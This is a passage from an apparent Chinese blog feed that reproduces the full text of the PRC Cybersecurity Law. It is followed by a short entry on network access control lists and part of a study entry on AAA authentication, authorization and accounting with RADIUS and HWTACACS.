    <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;目-录&quot;&gt;&lt;a href=&quot;#目-录&quot; class=&quot;headerlink&quot; title=&quot;目 录&quot;&gt;&lt;/a&gt;目 录&lt;/h4&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;第一章-总-则&quot;&gt;&lt;a href=&quot;#第一章-总-则&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="法律法规" scheme="https://shierjinghuang.github.io/tags/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    
  </entry>
  
  <entry>
    <title>ACL 访问控制列表</title>
    <link href="https://shierjinghuang.github.io/2023/04/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%20ACL/"/>
    <id>https://shierjinghuang.github.io/2023/04/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%20ACL/</id>
    <published>2023-04-02T02:58:35.000Z</published>
    <updated>2023-04-09T07:11:48.418Z</updated>
    
    <content type="html"><![CDATA[<center><h1>ACL 访问控制列表</h1></center>ACL可以通过对网络中报文流的精确识别，与其他技术结合，达到控制网络访问行为、防止网络攻击和提高网络带宽利用率的目的，从而切实保障网络环境的安全性和网络服务质量的可靠性<h3 id="ACL技术概述"><a href="#ACL技术概述" class="headerlink" title="ACL技术概述"></a>ACL技术概述</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;ACL 访问控制列表&lt;/h1&gt;&lt;/center&gt;
ACL可以通过对网络中报文流的精确识别，与其他技术结合，达到控制网络访问行为、防止网络攻击和提高网络带宽利用率的目的，从而切实保障网络环境的安全性和网络服务质量的可靠性

&lt;h3 id=&quot;ACL技术概述&quot;&gt;</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="ACL" scheme="https://shierjinghuang.github.io/tags/ACL/"/>
    
  </entry>
  
  <entry>
    <title>AAA 认证、授权及计费</title>
    <link href="https://shierjinghuang.github.io/2023/04/02/AAA%20%E8%AE%A4%E8%AF%81%E5%8F%8A%E9%85%8D%E7%BD%AE/"/>
    <id>https://shierjinghuang.github.io/2023/04/02/AAA%20%E8%AE%A4%E8%AF%81%E5%8F%8A%E9%85%8D%E7%BD%AE/</id>
    <published>2023-04-02T01:28:32.000Z</published>
    <updated>2023-04-09T07:11:31.455Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><font color="FF6600">AAA（Authentication, Authorization, and Accounting）是一种管理框架，它提供了授权部分用户访问指定资源和记录这些用户操作行为的安全机制。因其具有良好的可扩展性，并且容易实现用户信息的集中管理而被广泛使用</font></p></blockquote><ul><li>AAA可以通过多种协议来实现，在实际应用中，最常使用RADIUS协议</li></ul><h3 id="AAA概述"><a href="#AAA概述" class="headerlink" title="AAA概述"></a>AAA概述</h3><p>AAA是Authentication（认证）、Authorization（授权）和Accounting（计费）的简称，是网络安全的一种管理机制，提供了认证、授权、计费三种安全功能</p><ul><li><strong>认证 Authentication</strong>：验证用户是否可以获得访问权，确定哪些用户可以访问网络</li><li><strong>授权 Authorization</strong>：授权用户可以使用哪些服务</li><li><strong>计费 Accounting</strong>：记录用户使用网络资源的情况</li><li>网络运营商 ISP: 需要验证家庭宽带用户的账号密码之后才允许其上网，并记录用户的上网时长或上网流量等内容</li></ul><p><strong>AAA常见架构</strong>:AAA常见网络架构中包括用户、NAS（Network Access Server）、AAA服务器（AAA Server）</p><h4 id="认证-Authentication"><a href="#认证-Authentication" class="headerlink" title="认证 Authentication:"></a>认证 Authentication:</h4><ul><li>AAA支持三种认证方式:<ul><li>不认证：完全信任用户，不对用户身份进行合法性检查。鉴于安全考虑，这种认证方式很少被采用</li><li>本地认证：将本地用户信息（包括用户名、密码和各种属性）配置在NAS上，此时NAS就是AAA Server<ul><li>本地认证的优点是处理速度快、运营成本低；</li><li>缺点是存储信息量受设备硬件条件限制</li><li>这种认证方式常用于对用户登录设备进行管理，如Telnet，FTP用户等。</li></ul></li><li>远端认证：将用户信息（包括用户名、密码和各种属性）配置在认证服务器上。支持通过RADIUS协议或HWTACACS协议进行远端认证。NAS作为客户端，与RADIUS服务器或HWTACACS服务器进行通信。</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_认证示意图.png" style="zoom:50%;" /><h4 id="授权-Authorization："><a href="#授权-Authorization：" class="headerlink" title="授权 Authorization："></a>授权 Authorization：</h4><ul><li>AAA授权功能赋予用户访问的特定网络或设备的权限。AAA支持以下授权方式：<ul><li>不授权：不对用户进行授权处理</li><li>本地授权：根据NAS上对应域下的配置进行授权</li><li>远端授权：支持由RADIUS服务器授权或HWTACACS服务器授权<ul><li>HWTACACS授权，使用HWTACACS服务器对所有用户授权</li><li>RADIUS授权，只支持对通过RADIUS服务器认证的用户授权。RADIUS协议的认证和授权是绑定在一起的，不能单独使用RADIUS进行授权</li></ul></li></ul></li><li>当采用远端授权时，用户可以同时从授权服务器和NAS获取授权信息。NAS配置的授权信息优先级比授权服务器下发的授权信息低</li></ul><p>授权信息包括：所属用户组、所属VLAN、ACL编号等</p><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_授权示意图.png" style="zoom: 50%;" /><h4 id="计费-Accouting"><a href="#计费-Accouting" class="headerlink" title="计费 Accouting :"></a>计费 Accouting :</h4><blockquote><p>计费功能用于监控授权用户的网络行为和网络资源的使用情况。</p></blockquote><ul><li>AAA支持以下两种计费方式：<ul><li>不计费：为用户提供免费上网服务，不产生相关活动日志</li><li>远端计费：支持通过RADIUS服务器或HWTACACS服务器进行远端计费</li></ul></li></ul><h4 